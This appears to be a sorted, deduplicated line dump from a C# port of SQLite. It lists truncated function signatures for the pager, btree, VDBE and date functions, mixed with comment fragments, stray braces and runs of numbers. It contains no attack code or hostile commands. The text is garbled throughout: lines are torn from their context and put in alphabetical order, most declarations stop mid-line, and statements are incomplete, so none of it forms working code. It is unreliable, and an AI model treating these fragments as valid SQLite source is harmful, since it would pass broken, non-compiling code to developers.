    static int exprStructSize( Expr p )
    static int fillInCell(
    static int flattenSubquery(
    static int generateOutputSubroutine(
    static int getAndInitPage(
    static int getLockingMode( string z )
    static int getOverflowPage(
    static int getReadLock( sqlite3_file pFile )
    static int getSectorSize(
    static int getTempStore( string z )
    static int growOpArray( Vdbe p )
    static int hexToInt( int h )
    static int identLength( string z )
    static int invalidateTempStorage( Parse pParse )
    static int isAppropriateForFactoring( Expr p )
    static int isCandidateForInOpt( Select p )
    static int isDate(
    static int isLikeOrGlob(
    static int localtimeOffset( DateTime p )
    static int lockBtree(BtShared pBt)
    static int lookupName(
    static int memjrnlClose( MemJournal pJfd )
    static int memjrnlRead(
    static int memjrnlWrite(
    static int moveToLeftmost(BtCursor pCur)
    static int moveToRightmost(BtCursor pCur)
    static int moveToRoot(BtCursor pCur)
    static int multiSelect(
    static int multiSelectOrderBy(
    static int nQPlan = 0
    static int newDatabase(BtShared pBt)
    static int nocaseCollatingFunc(
    static int openDatabase(
    static int openSubJournal( Pager pPager )
    static int pagerOpentemp(
    static int pager_open_journal( Pager pPager )
    static int pager_pagehash( PgHdr X ) { return 0
    static int pager_playback_one_page(
    static int pager_write( PgHdr pPg )
    static int pager_write_pagelist( PgHdr pList )
    static int parseDateOrTime(
    static int pcache1Init( object NotUsed )
    static int pcache1Pagecount( sqlite3_pcache p )
    static int pcache1ResizeHash( PCache1 p )
    static int readDbPage( PgHdr pPg )
    static int readJournalHdr(
    static int relocatePage(
    static int resolveAsName(
    static int resolveCompoundOrderBy(
    static int resolveOrderByTermToExprList(
    static int resolveOrderGroupBy(
    static int restoreCursorPosition(BtCursor pCur)
    static int saveCursorPosition(BtCursor pCur)
    static int saved_cnt
    static int scratchAllocOut = 0
    static int selectColumnsFromExprList(
    static int setChildPtrmaps(MemPage pPage)
    static int sqlite3BtreeClose(ref Btree p)
    static int sqlite3BtreeCloseCursor(BtCursor pCur)
    static int sqlite3BtreeCommit(Btree p)
    static int sqlite3BtreeCommitPhaseTwo(Btree p)
    static int sqlite3BtreeCursor(
    static int sqlite3BtreeCursorSize()
    static int sqlite3BtreeDelete(BtCursor pCur)
    static int sqlite3BtreeFactory(
    static int sqlite3BtreeGetAutoVacuum(Btree p)
    static int sqlite3BtreeGetPageSize(Btree p)
    static int sqlite3BtreeGetReserve(Btree p)
    static int sqlite3BtreeIncrVacuum(Btree p)
    static int sqlite3BtreeInsert(
    static int sqlite3BtreeMovetoUnpacked(
    static int sqlite3BtreeOpen(
    static int sqlite3BtreeRollback(Btree p)
    static int sqlite3BtreeSchemaLocked(Btree p)
    static int sqlite3BtreeSyncDisabled(Btree p)
    static int sqlite3CodeRowTrigger(
    static int sqlite3Corrupt()
    static int sqlite3CreateFunc(
    static int sqlite3Dequote( ref string z )
    static int sqlite3ExprCodeExprList(
    static int sqlite3ExprCodeGetColumn(
    static int sqlite3ExprIsConstant( Expr p )
    static int sqlite3ExprIsConstantNotJoin( Expr p )
    static int sqlite3ExprIsConstantOrFunction( Expr p )
    static int sqlite3FixExpr(
    static int sqlite3FixExprList(
    static int sqlite3FixInit(
    static int sqlite3FixSelect(
    static int sqlite3FixSrcList(
    static int sqlite3FixTriggerStep(
    static int sqlite3GenerateIndexKey(
    static int sqlite3GetTempReg( Parse pParse )
    static int sqlite3InvokeBusyHandler( BusyHandler p )
    static int sqlite3JournalSize( sqlite3_vfs pVfs ) { return pVfs.szOsFile
    static int sqlite3LoadExtension(
    static int sqlite3LockAndPrepare(
    static int sqlite3MallocInit()
    static int sqlite3MallocSize( byte[] p )
    static int sqlite3MemInit( object NotUsed )
    static int sqlite3MemJournalSize()
    static int sqlite3MemRoundup( int n )
    static int sqlite3MemSize( byte[] pPrior )
    static int sqlite3MemoryAlarm(
    static int sqlite3MutexInit() { return SQLITE_OK
    static int sqlite3OpenTableAndIndices(
    static int sqlite3OpenTempDatabase( Parse pParse )
    static int sqlite3OsClose( sqlite3_file pId )
    static int sqlite3OsCloseFree( sqlite3_file pFile )
    static int sqlite3OsDeviceCharacteristics( sqlite3_file id )
    static int sqlite3OsFullPathname(
    static int sqlite3OsOpen(
    static int sqlite3OsOpenMalloc(
    static int sqlite3OsSectorSize( sqlite3_file id )
    static int sqlite3PagerAcquire(
    static int sqlite3PagerClose( Pager pPager )
    static int sqlite3PagerCommitPhaseOne(
    static int sqlite3PagerCommitPhaseTwo( Pager pPager )
    static int sqlite3PagerGet(
    static int sqlite3PagerOpen(
    static int sqlite3PagerPageRefcount( DbPage pPage )
    static int sqlite3PagerRefcount( Pager pPager )
    static int sqlite3PagerRollback( Pager pPager )
    static int sqlite3PagerSharedLock( Pager pPager )
    static int sqlite3PagerSync( Pager pPager )
    static int sqlite3PagerWrite( DbPage pDbPage )
    static int sqlite3PcacheFetch(
    static int sqlite3PcacheGetCachesize( PCache pCache )
    static int sqlite3PcacheInitialize()
    static int sqlite3PcachePageRefcount( PgHdr p )
    static int sqlite3PcachePagecount( PCache pCache )
    static int sqlite3PcacheRefCount( PCache pCache )
    static int sqlite3PcacheSize() { return 4
    static int sqlite3PendingByte = 0x40000000
    static int sqlite3Prepare(
    static int sqlite3ReadSchema( Parse pParse )
    static int sqlite3Reprepare( Vdbe p )
    static int sqlite3ResolveExprNames(
    static int sqlite3ResolveOrderGroupBy(
    static int sqlite3Select(
    static int sqlite3SelectExprHeight( Select p )
    static int sqlite3StatusValue( int op )
    static int sqlite3Step( Vdbe p )
    static int sqlite3Strlen30( StringBuilder z )
    static int sqlite3Strlen30( int z )
    static int sqlite3Strlen30( string z )
    static int sqlite3TwoPartName(
    static int sqlite3Utf8Read(
    static int sqlite3ValueFromExpr(
    static int sqlite3VarintLen( u64 v )
    static int sqlite3VdbeCurrentAddr( Vdbe p )
    static int sqlite3VdbeCursorMoveto( VdbeCursor p )
    static int sqlite3VdbeExec(
    static int sqlite3VdbeFinalize( Vdbe p )
    static int sqlite3VdbeHalt( Vdbe p )
    static int sqlite3VdbeIdxKeyCompare(
    static int sqlite3VdbeList(
    static int sqlite3VdbeMakeLabel( Vdbe p )
    static int sqlite3VdbeMemExpandBlob( Mem x ) { return SQLITE_OK
    static int sqlite3VdbeMemFromBtree(
    static int sqlite3VdbeMemIntegerify( Mem pMem )
    static int sqlite3VdbeMemMakeWriteable( Mem pMem )
    static int sqlite3VdbeMemNulTerminate( Mem pMem )
    static int sqlite3VdbeMemNumerify( Mem pMem )
    static int sqlite3VdbeMemRealify( Mem pMem )
    static int sqlite3VdbeMemSetStr(
    static int sqlite3VdbeRecordCompare(
    static int sqlite3VdbeReset( Vdbe p )
    static int sqlite3VdbeSerialGet(
    static int sqlite3VdbeSetColName(
    static int sqlite3_aggregate_count( sqlite3_context p )
    static int sqlite3_auto_extension( dxInit xInit )
    static int sqlite3_backup_pagecount( sqlite3_backup p )
    static int sqlite3_backup_remaining( sqlite3_backup p )
    static int sqlite3_bind_parameter_count( sqlite3_stmt pStmt )
    static int sqlite3_busy_handler(
    static int sqlite3_clear_bindings( sqlite3_stmt pStmt )
    static int sqlite3_collation_needed(
    static int sqlite3_create_collation(
    static int sqlite3_create_collation_v2(
    static int sqlite3_expired( sqlite3_stmt pStmt )
    static int sqlite3_extended_errcode( sqlite3 db )
    static int sqlite3_fullsync_count = 0
    static int sqlite3_global_recover()
    static int sqlite3_initialize()
    static int sqlite3_interrupt_count = 0
    static int sqlite3_io_error_benign = 0
    static int sqlite3_memory_alarm(
    static int sqlite3_mutex_try( int iType ) { return SQLITE_OK
    static int sqlite3_os_end()
    static int sqlite3_os_init()
    static int sqlite3_overload_function(
    static int sqlite3_release_memory( int n )
    static int sqlite3_shutdown()
    static int sqlite3_sync_count = 0
    static int sqlite3_value_numeric_type( sqlite3_value pVal )
    static int sqlite3_vfs_unregister( sqlite3_vfs pVfs )
    static int sqliteDefaultBusyCallback(
    static int subjournalPage( PgHdr pPg )
    static int syncJournal( Pager pPager )
    static int unlockReadLock( sqlite3_file pFile )
    static int vaNEXT
    static int winAccess(
    static int winClose( sqlite3_file id )
    static int winDelete(
    static int winDeviceCharacteristics( sqlite3_file id )
    static int winFullPathname(
    static int winOpen(
    static int winRead(
    static int winSectorSize( sqlite3_file id )
    static int winWrite(
    static int writeJournalHdr( Pager pPager )
    static int xferOptimization(
    static int yy_find_reduce_action(
    static int yy_find_shift_action(
    static int yy_pop_parser_stack(yyParser pParser)
    static int[] UpperToLower
    static int[] aHardLimit = new int[]  {
    static int[] opcodeProperty = OPFLG_INITIALIZER
    static int[] sqlite3PagerStats( Pager pPager )
    static int[] sqlite3UpperToLower = new int[]  {
    static object sqlite3_commit_hook(
    static object sqlite3_profile(
    static object sqlite3_rollback_hook(
    static object sqlite3_update_hook(
    static object sqlite3_user_data( sqlite3_context p )
    static object sqliteHashData( HashElem E ) { return E.data
    static short[] yy_reduce_ofst = new short[]{
    static short[] yy_shift_ofst = new short[]{
    static sqlite3 sqlite3VdbeDb( Vdbe v )
    static sqlite3 sqlite3_context_db_handle( sqlite3_context p )
    static sqlite3 sqlite3_db_handle( sqlite3_stmt pStmt )
    static sqlite3AutoExtList wsdAutoext = sqlite3Autoext
    static sqlite3PrngType sqlite3SavedPrng = null
    static sqlite3StatType wsdStat = sqlite3Stat
    static sqlite3_api_routines sqlite3Apis = new sqlite3_api_routines()
    static sqlite3_backup sqlite3PagerBackupPtr( Pager pPager )
    static sqlite3_file sqlite3PagerFile( Pager pPager )
    static sqlite3_int64 sqlite3BtreeGetCachedRowid(BtCursor pCur)
    static sqlite3_int64 sqlite3_memory_highwater( int resetFlag )
    static sqlite3_int64 sqlite3_memory_used()
    static sqlite3_io_methods MemJournalMethods = new sqlite3_io_methods(
    static sqlite3_io_methods winIoMethod = new sqlite3_io_methods(
    static sqlite3_mutex mutex = null
    static sqlite3_mutex sqlite3MutexAlloc( int iType ) { return new sqlite3_mutex()
    static sqlite3_mutex sqlite3_mutex_alloc( int iType ) { return new sqlite3_mutex()
    static sqlite3_value sqlite3ValueNew( sqlite3 db )
    static sqlite3_vfs sqlite3PagerVfs( Pager pPager )
    static sqlite3_vfs sqlite3_vfs_find( string zVfs )
    static sqlite3_vfs vfsList
    static sqlite3_vfs winVfs = new sqlite3_vfs(
    static sqlite_u3264 sqlite3Hwtime() { return (sqlite_u3264)System.DateTime.Now.Ticks
    static string SCHEMA_TABLE( int x ) //
    static string actionName( int action )
    static string columnName(
    static string columnType(
    static string convertUtf8Filename( string zFilename )
    static string selectOpName( int id )
    static string sqlite3BtreeGetFilename(Btree p)
    static string sqlite3BtreeGetJournalname(Btree p)
    static string sqlite3BtreeIntegrityCheck(
    static string sqlite3ErrStr( int rc )
    static string sqlite3OpcodeName( int i )
    static string sqlite3PagerFilename( Pager pPager )
    static string sqlite3PagerJournalname( Pager pPager )
    static string sqlite3StrAccumFinish( StrAccum p )
    static string sqlite3_sql( sqlite3_stmt pStmt )
    static string vaFORMAT
    static string zMagicHeader = SQLITE_FILE_HEADER
    static string[] yyRuleName = {
    static string[] yyTokenName = {
    static u16 operatorMask( int op )
    static u32 BITVEC_HASH( u32 X ) { return ( ( ( X ) 
    static u32 JOURNAL_HDR_SZ( Pager pPager )
    static u32 PENDING_BYTE_PAGE( BtShared pBt ) { return (u32)PAGER_MJ_PGNO( pBt.pPager )
    static u32 sqlite3BitvecSize( Bitvec p )
    static u32 sqlite3Get4byte( u8[] p )
    static u32 sqlite3VdbeSerialGet(
    static u32 sqlite3VdbeSerialTypeLen( u32 serial_type )
    static u8 ENC( sqlite3 db ) { return db.aDb[0].pSchema.enc
    static u8 SQLITE_BIGENDIAN = 0
    static u8 SQLITE_LITTLEENDIAN = 1
    static u8 SQLITE_UTF16NATIVE = ( SQLITE_BIGENDIAN != 0 
    static u8 getAutoVacuum( string z )
    static u8 getBoolean( string z )
    static u8 getSafetyLevel( string z )
    static u8 minMaxQuery( Select p )
    static u8 randomu8()
    static u8 sqlite3_get_autocommit( sqlite3 db )
    static void //sqlite3ScratchFree( ref byte[] p )
    static void //sqlite3ScratchFree( ref byte[][] p ) { p = null
    static void //sqlite3_free( ref byte[] p )
    static void //sqlite3_free( ref string x )
    static void //sqlite3_free<T>( ref T x ) where T : class
    static void Cleanup( Vdbe p )
    static void DO_OS_MALLOC_TEST( sqlite3_file x ) { }
    static void ExprSetIrreducible( Expr X ) { X.flags2 
    static void OSTRACE1( string X ) { if ( sqlite3OsTrace ) sqlite3DebugPrintf( X )
    static void OpenCounter( int X )
    static void PAGER_INCR( ref int v ) { v
    static void PAGER_INCR(ref int v) {}
    static void SQLITE_SKIP_UTF8(
    static void SimulateIOErrorBenign( int X ) { sqlite3_io_error_benign = ( X )
    static void UNUSED_PARAMETER<T>( T x ) { }
    static void UPDATE_MAX_BLOBSIZE( Mem P ) { updateMaxBlobsize( P )
    static void _storeTypeInfo( Mem pMem )
    static void absFunc(
    static void addWhereTerm(
    static void allocateTempSpace(BtShared pBt)
    static void analyzeOneTable(
    static void applyAffinity(
    static void applyNumericAffinity( Mem pRec )
    static void assemblePage(
    static void assertCellInfo(BtCursor pCur)
    static void assertTruncateConstraint( Pager pPager )
    static void assertTruncateConstraint(Pager pPager) { }
    static void assertTruncateConstraintCb( PgHdr pPg )
    static void assertTruncateConstraintCb(PgHdr pPg) { }
    static void attachBackupObject( sqlite3_backup p )
    static void attachFunc(
    static void avgFinalize( sqlite3_context context )
    static void bestBtreeIndex(
    static void bestIndex(
    static void bestOrClauseIndex(
    static void btreeClearHasContent(BtShared pBt)
    static void btreeEndTransaction(Btree p)
    static void btreeIntegrity( Btree p )
    static void btreeIntegrity(Btree p) { }
    static void btreeParseCell(
    static void btreeParseCellPtr(
    static void cdateFunc(
    static void changes(
    static void checkActiveVdbeCnt( sqlite3 db )
    static void checkAppendMsg(
    static void checkList(
    static void checkPtrmap(
    static void clearAllSharedCacheTableLocks(Btree a) { }
    static void clearYMD_HMS_TZ( DateTime p )
    static void closeAllCursors( Vdbe p )
    static void codeAttach(
    static void codeCompareOperands(
    static void codeDistinct(
    static void codeOffset(
    static void codeTableLocks( Parse pParse ) { }
    static void columnMallocFailure( sqlite3_stmt pStmt )
    static void computeHMS( DateTime p )
    static void computeJD( DateTime p )
    static void computeYMD( DateTime p )
    static void computeYMD_HMS( DateTime p )
    static void corruptSchema(
    static void countFinalize( sqlite3_context context )
    static void countStep(
    static void createVarMap( Vdbe p )
    static void ctimeFunc(
    static void ctimestampFunc(
    static void dateFunc(
    static void datetimeFunc(
    static void detachFunc(
    static void disable_simulated_io_errors()
    static void downgradeAllSharedCacheTableLocks(Btree a) { }
    static void enable_simulated_io_errors()
    static void expandBlob( Mem P )
    static void exprAnalyze(
    static void exprAnalyzeAll(
    static void exprAnalyzeOrTerm(
    static void exprSetHeight( Expr p )
    static void freeIndex( ref Index p )
    static void freeTempSpace(BtShared pBt)
    static void generateColumnNames(
    static void generateColumnTypes(
    static void generateSortTail(
    static void getCellInfo(BtCursor pCur)
    static void groupConcatFinalize( sqlite3_context context )
    static void groupConcatStep(
    static void hexFunc(
    static void ifnullFunc(
    static void insertCell(
    static void insertElement(
    static void invalidateAllOverflowCache(BtShared pBt) { }
    static void invalidateCursorsOnModifiedBtrees( sqlite3 db )
    static void invalidateOverflowCache(BtCursor pCur) { }
    static void juliandayFunc(
    static void last_insert_rowid(
    static void lengthFunc(
    static void likeFunc(
    static void loadExt(
    static void local_ioerr()
    static void lowerFunc(
    static void minMaxFinalize( sqlite3_context context )
    static void minmaxFunc(
    static void minmaxStep(
    static void moveToParent(BtCursor pCur)
    static void nullifFunc(
    static void openStatTable(
    static void pageReinit(DbPage pData)
    static void pagerReportSize( Pager pPager ) { }
    static void pagerUnlockAndRollback( Pager pPager )
    static void pagerUnlockIfUnused( Pager pPager )
    static void pager_reset( Pager pPager )
    static void pager_unlock( Pager pPager )
    static void pcache1Destroy( ref sqlite3_pcache p )
    static void pcache1EnforceMaxPage()
    static void pcache1EnterMutex() { sqlite3_mutex_enter( pcache1.mutex )
    static void pcache1Free( ref PgHdr p )
    static void pcache1FreePage( ref PgHdr1 p )
    static void pcache1LeaveMutex() { sqlite3_mutex_leave( pcache1.mutex )
    static void pcache1PinPage( PgHdr1 pPage )
    static void pcache1Rekey(
    static void pcache1RemoveFromHash( PgHdr1 pPage )
    static void pcache1Shutdown( object NotUsed )
    static void pcache1TruncateUnsafe(
    static void pcacheAddToDirtyList( PgHdr pPage )
    static void pcacheRemoveFromDirtyList( PgHdr pPage )
    static void pcacheUnpin( PgHdr p )
    static void pushOntoSorter(
    static void quoteFunc(
    static void randomBlob(
    static void randomFunc(
    static void releaseAllSavepoints( Pager pPager )
    static void releasePage(MemPage pPage)
    static void removeElementGivenHash(
    static void renameTableFunc(
    static void renameTriggerFunc(
    static void replaceFunc(
    static void resolveAlias(
    static void resolveOutOfRangeError(
    static void roundFunc(
    static void rowSetSort( RowSet p )
    static void rowSetToList( RowSet p )
    static void rowSetTreeToList(
    static void schemaIsValid( Parse pParse )
    static void seekJournalHdr( Pager pPager )
    static void selectAddColumnTypeAndCollation(
    static void selectInnerLoop(
    static void setResultStrOrError(
    static void setSectorSize( Pager pPager )
    static void softHeapLimitEnforcer(
    static void spanBinaryExpr(
    static void spanUnaryPostfix(
    static void spanUnaryPrefix(
    static void sqlite3AddCheckConstraint(
    static void sqlite3AddPrimaryKey(
    static void sqlite3AlterFunctions( sqlite3 db )
    static void sqlite3AlterRenameTable(
    static void sqlite3AutoLoadExtensions( sqlite3 db )
    static void sqlite3AutoincrementBegin( Parse pParse )
    static void sqlite3AutoincrementEnd( Parse pParse )
    static void sqlite3BackupRestart( sqlite3_backup pBackup )
    static void sqlite3BeginBenignMalloc()
    static void sqlite3BeginTrigger(
    static void sqlite3BenignMallocHooks(
    static void sqlite3BitvecDestroy( ref Bitvec p )
    static void sqlite3BtreeClearCursor(BtCursor pCur)
    static void sqlite3BtreeEnter( Btree bt ) { }
    static void sqlite3BtreeEnterAll( sqlite3 p ) { }
    static void sqlite3BtreeEnterCursor( BtCursor X ) { }
    static void sqlite3BtreeLeave( Btree X ) { }
    static void sqlite3BtreeLeaveAll( sqlite3 X ) { }
    static void sqlite3BtreeLeaveCursor( BtCursor X ) { }
    static void sqlite3BtreeMutexArrayEnter( BtreeMutexArray X ) { }
    static void sqlite3BtreeMutexArrayLeave( BtreeMutexArray X ) { }
    static void sqlite3CloseExtensions( sqlite3 db )
    static void sqlite3CloseSavepoints( sqlite3 db )
    static void sqlite3CodeSubselect(
    static void sqlite3CommitInternalChanges( sqlite3 db )
    static void sqlite3CommitTransaction( Parse pParse )
    static void sqlite3CompleteInsertion(
    static void sqlite3ConnectionClosed( sqlite3 x ) { }                     //
    static void sqlite3ConnectionUnlocked( sqlite3 x ) { }                   //
    static void sqlite3CreateForeignKey(
    static void sqlite3CreateIndex(
    static void sqlite3CreateView(
    static void sqlite3DefaultRowEst( Index pIdx )
    static void sqlite3DeleteFrom(
    static void sqlite3DeleteIndex( Index p )
    static void sqlite3DeleteTable( ref Table pTable )
    static void sqlite3EndBenignMalloc()
    static void sqlite3EndTable(
    static void sqlite3ErrorClear( Parse pParse )
    static void sqlite3ExpirePreparedStatements( sqlite3 db )
    static void sqlite3ExprAttachSubtrees(
    static void sqlite3ExprCacheClear( Parse pParse )
    static void sqlite3ExprCachePush( Parse pParse )
    static void sqlite3ExprListCheckLength(
    static void sqlite3ExprListSetName(
    static void sqlite3ExprListSetSpan(
    static void sqlite3FinishCoding( Parse pParse )
    static void sqlite3FinishTrigger(
    static void sqlite3FuncDefInsert(
    static void sqlite3GenerateConstraintChecks(
    static void sqlite3GenerateRowDelete(
    static void sqlite3GenerateRowIndexDelete(
    static void sqlite3HashClear( Hash pH )
    static void sqlite3HashInit( Hash pNew )
    static void sqlite3Insert(
    static void sqlite3InvalidFunction(
    static void sqlite3MallocAlarm( int nByte )
    static void sqlite3MallocEnd()
    static void sqlite3MaterializeView(
    static void sqlite3MemFree( ref  string x ) { x = null
    static void sqlite3MemFree<T>( ref T x ) where T : class
    static void sqlite3MemJournalOpen( sqlite3_file pJfd )
    static void sqlite3MemSetDefault()
    static void sqlite3MemShutdown( object NotUsed )
    static void sqlite3MutexEnd() { }                                //
    static void sqlite3OpenTable(
    static void sqlite3PCacheSetDefault()
    static void sqlite3PageFree( ref PgHdr p)
    static void sqlite3PagerDontWrite( PgHdr pPg )
    static void sqlite3PagerRef( DbPage pPg )
    static void sqlite3PagerSetBusyhandler(
    static void sqlite3PagerUnref( DbPage pPg )
    static void sqlite3Parser(
    static void sqlite3ParserFree(
    static void sqlite3PcacheCleanAll( PCache pCache )
    static void sqlite3PcacheClear( PCache pCache )
    static void sqlite3PcacheClearSyncFlags( PCache pCache )
    static void sqlite3PcacheClose( PCache pCache )
    static void sqlite3PcacheDrop( PgHdr p )
    static void sqlite3PcacheMakeClean( PgHdr p )
    static void sqlite3PcacheMakeDirty( PgHdr p )
    static void sqlite3PcacheOpen(
    static void sqlite3PcacheRef( PgHdr p )
    static void sqlite3PcacheRelease( PgHdr p )
    static void sqlite3PcacheShutdown()
    static void sqlite3PcacheStats(
    static void sqlite3Pragma(
    static void sqlite3PrngResetState()
    static void sqlite3PrngRestoreState()
    static void sqlite3PrngSaveState()
    static void sqlite3RegisterBuiltinFunctions( sqlite3 db )
    static void sqlite3RegisterDateTimeFunctions()
    static void sqlite3RegisterGlobalFunctions()
    static void sqlite3ResolveSelectNames(
    static void sqlite3RollbackAll( sqlite3 db )
    static void sqlite3RollbackTransaction( Parse pParse )
    static void sqlite3RowSetClear( RowSet p )
    static void sqlite3SchemaFree( Schema p )
    static void sqlite3SelectPrep(
    static void sqlite3SrcListShiftJoinType( SrcList p )
    static void sqlite3StartTable(
    static void sqlite3StrAccumReset( StrAccum p )
    static void sqlite3Update(
    static void sqlite3VXPrintf(
    static void sqlite3Vacuum( Parse pParse )
    static void sqlite3ValueApplyAffinity(
    static void sqlite3ValueFree( ref sqlite3_value v )
    static void sqlite3ValueSetStr(
    static void sqlite3VdbeCountChanges( Vdbe v )
    static void sqlite3VdbeDelete( ref Vdbe p )
    static void sqlite3VdbeDeleteUnpackedRecord( UnpackedRecord p )
    static void sqlite3VdbeIOTraceSql( Vdbe X ) { }
    static void sqlite3VdbeIntegerAffinity( Mem pMem )
    static void sqlite3VdbeMakeReady(
    static void sqlite3VdbeMemRelease( Mem p )
    static void sqlite3VdbeMemReleaseExternal( Mem p )
    static void sqlite3VdbeMemSetNull( Mem pMem )
    static void sqlite3VdbeMemSetRowSet( Mem pMem )
    static void sqlite3VdbeMutexArrayEnter( Vdbe p ) { }
    static void sqlite3VdbePrintSql( Vdbe p )
    static void sqlite3VdbeResetStepResult( Vdbe p )
    static void sqlite3VtabArgInit( Parse p ) { }//
    static void sqlite3VtabClear( Table Y ) { }
    static void sqlite3VtabCommit( sqlite3 X ) { }
    static void sqlite3VtabLock( VTable X ) { }
    static void sqlite3VtabRollback( sqlite3 X ) { }
    static void sqlite3VtabUnlock( VTable X ) { }
    static void sqlite3VtabUnlockList( sqlite3 X ) { }
    static void sqlite3WhereEnd( WhereInfo pWInfo )
    static void sqlite3_interrupt( sqlite3 db )
    static void sqlite3_mutex_enter( sqlite3_mutex m ) { }            //
    static void sqlite3_mutex_free( ref sqlite3_mutex m ) { }          //
    static void sqlite3_mutex_leave( sqlite3_mutex m ) { }            //
    static void sqlite3_progress_handler(
    static void sqlite3_reset_auto_extension()
    static void sqlite3_result_error_nomem( sqlite3_context pCtx )
    static void sqlite3_result_error_toobig( sqlite3_context pCtx )
    static void sqlite3_result_null( sqlite3_context pCtx )
    static void sqlite3_set_auxdata(
    static void sqlite3_soft_heap_limit( int n )
    static void sqliteResetColumnNames( Table pTable )
    static void strftimeFunc(
    static void substExprList(
    static void substSelect(
    static void substrFunc(
    static void sumFinalize( sqlite3_context context )
    static void sumStep(
    static void testcase<T>( T X ) { }
    static void timeFunc(
    static void totalFinalize( sqlite3_context context )
    static void total_changes(
    static void trimFunc(
    static void typeofFunc(
    static void unlockBtreeIfUnused(BtShared pBt)
    static void updateMaxBlobsize( Mem p )
    static void upperFunc(
    static void va_end( object[] ap )
    static void versionFunc(
    static void vfsUnlink( sqlite3_vfs pVfs )
    static void whereClauseClear( WhereClause pWC )
    static void whereClauseInit(
    static void wsdAutoextInit() { }
    static void wsdHooksInit() { }
    static void wsdStatInit() { }
    static void x_CountFinalize( sqlite3_context context )
    static void x_CountStep(
    static void yy_accept(
    static void yy_destructor(
    static void yy_parse_failed(
    static void yy_reduce(
    static void yy_shift(
    static void yy_syntax_error(
    static void yytestcase<T>(T X) { testcase(X)
    static void zeroblobFunc(
    static yyParser sqlite3ParserAlloc()
    string zContext        /
    string zDbase     /
    string zExtra   /
    string zName        /
    string zObject
    string zParentContext  /
    string zRelative     /
    string zSrcDb                    /
    string zToken         /
    string zType          /
    string zType         /
    string zVfs        /
    string zVfs       /
    string zWhere       /
    struct Table.
    struct compareInfo
    struct sPragmaType
    structure 
    szNew[i]: Spaced used on the i-th sibling page.
    the error symbol.
    trans_begun:
    trigger program(s).
    u16 wctrlFlags          /
    u16[] aSize       /
    u32 h               /
    u32 h         /
    u32 iLimit
    u32 iNew
    u8 create
    u8 createFlag       /
    u8 encoding          /
    u8 exact
    u8 noContent     /
    u8 orconf           /
    u8 orconf          /
    unixepoch
    using Vdbe = CSSQLite.Vdbe
    using sqlite = CSSQLite.sqlite3
    v = sqlite3GetVdbe(pParse)
    va_list[] ap                   /
    void sqlite3PrintExpr( Expr p )
    void sqlite3PrintExprList( ExprList pList )
    void sqlite3_thread_cleanup()
    void_function xBenignEnd //void (
    weekday N
    x BETWEEN y AND z
    x>=y AND x<=z
    xDestroy(pAux)
    yyParser yypParser           /
    {
    {             /
    {            /
    {      //  va_list ap
    {    /
    {   /
    { //(
    { if ( ( P.flags 
    { pData[Offset 
    { return ( ( OMIT_TEMPDB == 0 ) 
    { return ( pPager.pageSize 
    { return ( pPager.sectorSize )
    { return atoi( Encoding.UTF8.GetString( inStr ) )
    { return p[offset 
    { x = null
    {// (
    {//void 
    }
    } 
    }                                                              /
    } /
    } else {
    }else
    }else {
    }else{
    }while( p )
   %%  %
   %H  hour 00-24
   %J  
   %M  minute 00-59
   %S  seconds 00-59
   %W  week of year 00-53
   %Y  year 0000-9999
   %d  day of month
   %f  
   %j  day of year 000-366
   %m  month 01-12
   %s  seconds since 1970-01-01
   %w  day of week 0-6  sunday==0
   (0) START     At the beginning or end of an SQL statement.  This routine
   (0) tkSEMI      A semicolon.
   (1)  Register to hold the name of the pTab table.
   (1)  SELECT 
   (1)  The subquery and the outer query do not both use aggregates.
   (1) NORMAL    We are in the middle of statement which ends with a single
   (1) tkWS        Whitespace
   (2)  Register to hold the maximum ROWID of pTab.
   (2)  SELECT 
   (2)  The subquery is not an aggregate or the outer query is not a join.
   (2) EXPLAIN   The keyword EXPLAIN has been seen at the beginning of
   (2) tkOTHER     Any other SQL token.
   (3)  Register to hold the rowid in sqlite_sequence of pTab
   (3)  SELECT 
   (3)  The subquery is not the right operand of a left outer join
   (3) CREATE    The keyword CREATE has been seen at the beginning of a
   (4)  The subquery is not DISTINCT or the outer query is not a join.
   (4) TRIGGER   We are in the middle of a trigger definition that must be
   (5)  The subquery is not DISTINCT or the outer query does not use
   (6)  The subquery does not use aggregates or the outer query is not
   (7)  The subquery has a FROM clause.
   (8)  The subquery does not use LIMIT or the outer query is not a join.
   (9)  The subquery does not use LIMIT or the outer query does not use
   (A)  The original rowid of that row.
   (B)  The revised rowid for the row. (note1)
   (C)  The content of every column in the row.
   (a) The specified b-tree connection handle is connected to a sharable
   (b) No other b-tree connection handle holds a lock that conflicts
   (e) the cursor points at a valid row of an intKey table.
   (eLock==WRITE_LOCK 
   (i.e. either SQLITE_IOERR or SQLITE_CORRUPT).
   (if any) is only written into the journal file once.
   (operation 1) failed. However the pager must enter the error state
   (the 4-byte header field at byte offset 24 of the database file) is
   (x 
   )
   --------------     ---------------    ---------------
   -----------------     --------------     ------------------------------
   ---------------------------------------
   --------------------------------------------------------
   ----------------------------------------------------------------
   ...
   /
   //
   // 
   // if( aNew==0 ) return
   //void (
   //}
   0 
   0                         0
   0                     any                file      (return 0)
   0123456789 123456789 123456789 123 
   1 
   1                     0                  file      (return 0)
   1                     1                  file      (return 0)
   1                     2                  memory    (return 1)
   1) Each entry in the list has a non-NULL value for either
   1) If the pager is currently in PAGER_UNLOCK state (no lock held
   1) If the sqlite3.pBlockingConnection member of a list entry is
   1) It is a virtual table and no implementation of the xUpdate method
   1) The entries associated with new sibling pages that were not
   1) The in-memory representation grows too large for the allocated
   1) When all data is deleted from a page and the page becomes
   1. There is a single object in the FROM clause.
   100 
   100                       512
   100 bytes.  Page 1 only.
   110 
   120 
   130 
   140 
   150 
   160 
   170 
   180 
   190 
   2 
   2                     0                  memory    (return 1)
   2                     1                  file      (return 0)
   2                     2                  memory    (return 1)
   2) All entries in the list that share a common value for
   2) If the sqlite3.pUnlockConnection member of a list entry is
   2) The pointer-map entries associated with the first overflow
   2) The sqlite3JournalCreate() function is called.
   2.  Read/write cursors for all indices of pTab must be open as
   200 
   2000                      2048
   210 
   220 
   230 
   240 
   250 
   260 
   270 
   280 
   290 
   3 
   3                     any                memory    (return 1)
   3) If the two steps above mean that pBlockingConnection==0 and
   3.  The record number of the row to be deleted must be stored in
   300 
   310 
   320 
   330 
   340 
   350 
   360 
   370 
   380 
   390 
   4 
   4. If none of the first three conditions apply and the cache is marked
   400 
   410 
   420 
   430 
   440 
   450 
   460 
   470 
   480 
   490 
   5 
   500 
   510 
   512                       512
   520 
   530 
   540 
   550 
   560 
   570 
   580 
   590 
   6 
   600 
   610 
   620 
   630 
   640 
   650 
   660 
   670 
   680 
   690 
